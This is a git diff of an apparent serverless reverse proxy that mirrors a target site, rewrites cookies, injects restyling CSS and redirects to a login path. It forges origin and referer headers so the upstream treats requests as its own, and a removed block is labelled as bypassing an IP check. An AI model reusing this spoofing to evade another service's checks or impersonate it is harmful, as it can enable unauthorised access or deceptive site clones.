@@ -39,6 +39,7 @@ function stripCookieDomain(cookie) {
 function buildClientScript() {
   return `
   <style>
+  /* Warna Merah */
   :root { --primary: #ef4444 !important; --accent: #dc2626 !important; }
   .bg-purple-500, .bg-purple-600, .bg-purple-700, .bg-violet-500, .bg-violet-600, 
   [style*="#a855f7"], [style*="#8b5cf6"], [style*="#7c3aed"] { background-color: #ef4444 !important; border-color: #ef4444 !important; }
@@ -104,12 +105,17 @@ function buildClientScript() {
 })();</script>`;
 }
 
+export const config = {
+  api: {
+    bodyParser: false, // MATIKIN PARSER OTOMATIS VERCEL
+  },
+};
+
 export default async function handler(req, res) {
   if (req.method === "OPTIONS") return res.status(204).end();
 
   try {
     let path = (req.query.path || "").replace(/^\/+/, "");
-    
     if (!path) { res.writeHead(302, { Location: "/login", "Cache-Control": "no-store" }); return res.end(); }
 
     const searchParams = new URLSearchParams();
@@ -126,31 +132,26 @@ export default async function handler(req, res) {
       fwd[k] = value;
     }
 
-    // === KUNCI BIAR SERVER NGANGGEB LU ASLI ===
     fwd["origin"] = TARGET_ORIGIN;
     fwd["referer"] = TARGET_ORIGIN + "/";
-    fwd["accept"] = "application/json, text/plain, */*";
-    
-    // Bypass IP Check
-    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    fwd["x-forwarded-for"] = clientIp;
-    fwd["x-real-ip"] = clientIp;
 
+    // Baca raw body stream
     let body;
-    if (!["GET", "HEAD"].includes(req.method) && req.body !== undefined) {
-      const contentType = req.headers["content-type"] || "";
-      // FIX: Kalau aslinya form-urlencoded, jangan diubah jadi JSON
-      if (Buffer.isBuffer(req.body) || typeof req.body === "string") {
-        body = req.body;
-      } else if (contentType.includes("application/x-www-form-urlencoded")) {
-        body = new URLSearchParams(req.body).toString();
-      } else {
-        body = JSON.stringify(req.body);
-        if (!fwd["content-type"]) fwd["content-type"] = "application/json";
-      }
+    if (!["GET", "HEAD"].includes(req.method)) {
+      body = await new Promise((resolve, reject) => {
+        const chunks = [];
+        req.on("data", (c) => chunks.push(c));
+        req.on("end", () => resolve(Buffer.concat(chunks)));
+        req.on("error", reject);
+      });
     }
 
-    const upstream = await fetch(targetUrl, { method: req.method, headers: fwd, body, redirect: "manual" });
+    const upstream = await fetch(targetUrl, { 
+      method: req.method, 
+      headers: fwd, 
+      body: body,
+      redirect: "manual" 
+    });
 
     let setCookies = [];
     if (typeof upstream.headers.getSetCookie === "function") setCookies = upstream.headers.getSetCookie();
@@ -182,6 +183,7 @@ export default async function handler(req, res) {
       return res.end(html);
     }
 
+    // Kalau JSON / API Response, terusin mentah-mentah
     const buf = Buffer.from(await upstream.arrayBuffer());
     res.statusCode = upstream.status;
     res.setHeader("content-type", ct || "application/octet-stream");
